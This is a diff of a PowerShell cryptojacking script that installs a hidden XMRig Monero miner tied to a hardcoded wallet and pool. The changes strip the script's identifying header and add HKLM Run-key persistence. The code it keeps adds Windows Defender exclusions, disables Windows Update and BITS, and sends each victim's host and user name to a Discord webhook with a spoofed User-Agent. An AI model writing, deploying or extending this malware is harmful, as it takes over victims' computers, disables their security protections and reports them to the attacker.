@@ -1,10 +1,4 @@
-\# ============================================================
-#  XMR Standalone Pro Deployer v6.1 (ECHO SOUL)
-#  - Base: 100% Stable Soul v6.0
-#  - Fixed: Discord Webhook Headers (No more silences!)
-#  - Added: Fake User-Agent for Discord Compatibility
-# ============================================================
-
+$null = "" # Header Safe Skip
 # ==================== CONFIG ====================
 $wallet         = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
 $pool           = "pool.hashvault.pro:443"
@@ -180,6 +174,12 @@ function Set-Persistence {
         Set-ItemProperty $reg "WindowsServiceMonitor" "wscript.exe `"$watchdogVbs`"" -Force
     } catch {}
 
+    try {
+        $regLM = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
+        Set-ItemProperty $regLM "WindowsServiceUpdate" "`"$xmrigExe`" --config=`"$configFile`"" -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty $regLM "WindowsServiceMonitor" "wscript.exe `"$watchdogVbs`"" -Force -ErrorAction SilentlyContinue
+    } catch {}
+
     $start = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
     try {
         $ws = New-Object -ComObject WScript.Shell
@@ -224,21 +224,16 @@ function Disable-Sleep {
 function Send-DiscordWebhook {
     $webhookUrl = "https://discord.com/api/webhooks/1506387263402278992/f3X-mX_mjq74YCqpZYNB2WH4hEg6NZj8LY6lPstCCtz31kJwthqkxXF580E187PnZI2a"
     try {
-        # Discord requires a User-Agent to avoid 403 Forbidden!
         $headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" }
         $payload = @{ username = "itzcurled-miner"; embeds = @(@{ title = "Miner Live! ⚡"; color = 3447003; fields = @(@{ name = "Host"; value = "$env:COMPUTERNAME"; inline = $true }, @{ name = "User"; value = "$env:USERNAME"; inline = $true }); timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") }) } | ConvertTo-Json -Depth 5
         Invoke-RestMethod $webhookUrl -Headers $headers -Method Post -Body $payload -ContentType "application/json" | Out-Null
     } catch {}
 }
 
-# ==================== MAIN ====================
 try {
-    # Establish TLS connection globally first
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
-    
     Add-MpPreference -ExclusionPath "$installDir", "$env:TEMP" -ErrorAction SilentlyContinue
     try { & sc.exe config wuauserv start= disabled >$null 2>&1; & sc.exe stop wuauserv >$null 2>&1; & sc.exe config bits start= disabled >$null 2>&1; & sc.exe stop bits >$null 2>&1 } catch {}
-    
     Disable-Sleep; Enable-HugePages
     Install-Miner; Write-MinerConfig; Write-Watchdog; Write-VbsLauncher; Set-Persistence
     Start-Process "$xmrigExe" -ArgumentList "--config=`"$configFile`"" -WindowStyle Hidden
